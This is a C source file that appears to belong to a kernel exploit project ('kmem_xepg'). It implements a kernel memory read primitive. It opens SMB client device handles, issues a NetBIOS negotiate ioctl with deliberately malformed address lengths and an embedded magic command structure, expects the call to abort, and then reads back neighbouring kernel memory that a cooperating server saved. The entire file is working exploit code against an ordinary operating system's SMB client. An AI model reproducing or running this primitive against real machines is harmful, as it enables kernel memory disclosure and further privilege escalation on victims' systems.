//
//  zkext_neighbor_reader_xs.c
//  kmem_xepg
//
//  Created by admin on 1/3/22.
//

#include <assert.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <sys/errno.h>

#include "../smb/client.h"
#include "../public/kmem_xepg/smb_custom.h"

#include "zkext_neighbor_reader_xs.h"
#include "util_assert.h"


static _Atomic uint32_t kmem_zkext_neighbor_reader_xs_keygen = 0;

struct kmem_zkext_neighbor_reader_xs {
    int fd_paddr_reader;
    int fd_kmem_reader;
    struct sockaddr_in smb_addr;
};


kmem_zkext_neighbor_reader_xs_t kmem_zkext_neighbor_reader_xs_create(const struct sockaddr_in* smb_addr) {
    kmem_zkext_neighbor_reader_xs_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader_xs));
    reader->fd_paddr_reader = smb_client_open_dev();
    xe_assert_cond(reader->fd_paddr_reader, >=, 0);
    reader->fd_kmem_reader = smb_client_open_dev();
    xe_assert_cond(reader->fd_kmem_reader, >=, 0);
    reader->smb_addr = *smb_addr;
    
    int error = smb_client_ioc_negotiate(reader->fd_paddr_reader, smb_addr, sizeof(*smb_addr), FALSE);
    xe_assert_err(error);
    
    error = smb_client_ioc_tcon(reader->fd_paddr_reader, "default");
    xe_assert_err(error);
    
    return reader;
}

void kmem_zkext_neighbor_reader_xs_read(kmem_zkext_neighbor_reader_xs_t reader, uint8_t saddr_snb_len, uint32_t saddr_ioc_len, uint8_t saddr_snb_name, uint8_t laddr_snb_len, uint32_t laddr_ioc_len, uint8_t laddr_snb_name, char* dst, uint32_t dst_size) {
    xe_assert_cond(saddr_snb_name, !=, 0xff);
    xe_assert_cond(laddr_snb_name, !=, 0xff);
    xe_assert_cond(laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct kmem_xepg_cmd_paddr) + 1);
    
    struct sockaddr_nb saddr;
    struct sockaddr_nb laddr;
    
    bzero(&saddr, sizeof(saddr));
    bzero(&laddr, sizeof(laddr));
    
    saddr.snb_family = AF_NETBIOS;
    saddr.snb_addrin = reader->smb_addr;
    saddr.snb_len = saddr_snb_len;
    saddr.snb_name[0] = saddr_snb_name;
    
    laddr.snb_family = AF_NETBIOS;
    laddr.snb_len = laddr_snb_len;
    laddr.snb_name[0] = laddr_snb_name;
    static_assert(sizeof(laddr.snb_name) >= sizeof(struct kmem_xepg_cmd_paddr) + 1, "");
    struct kmem_xepg_cmd_paddr* cmd_paddr = (struct kmem_xepg_cmd_paddr*)&laddr.snb_name[1];
    cmd_paddr->key = atomic_fetch_add(&kmem_zkext_neighbor_reader_xs_keygen, 1);
    cmd_paddr->magic = KMEM_XEPG_CMD_PADDR_MAGIC;
    cmd_paddr->flags = KMEM_XEPG_CMD_PADDR_FLAG_FAIL | KMEM_XEPG_CMD_PADDR_FLAG_SAVE;
    
    int error = smb_client_ioc_negotiate_nb(reader->fd_kmem_reader, &saddr, saddr_ioc_len, &laddr, laddr_ioc_len);
    xe_assert_cond(error, ==, ECONNABORTED);
    
    error = smb_client_ioc_read_saved_nb_ssn_request(reader->fd_paddr_reader, cmd_paddr->key, dst, dst_size);
    xe_assert_err(error);
}

void kmem_zkext_neighbor_reader_xs_destroy(kmem_zkext_neighbor_reader_xs_t* reader_p) {
    kmem_zkext_neighbor_reader_xs_t reader = *reader_p;
    close(reader->fd_kmem_reader);
    close(reader->fd_paddr_reader);
    free(reader);
    *reader_p = NULL;
}
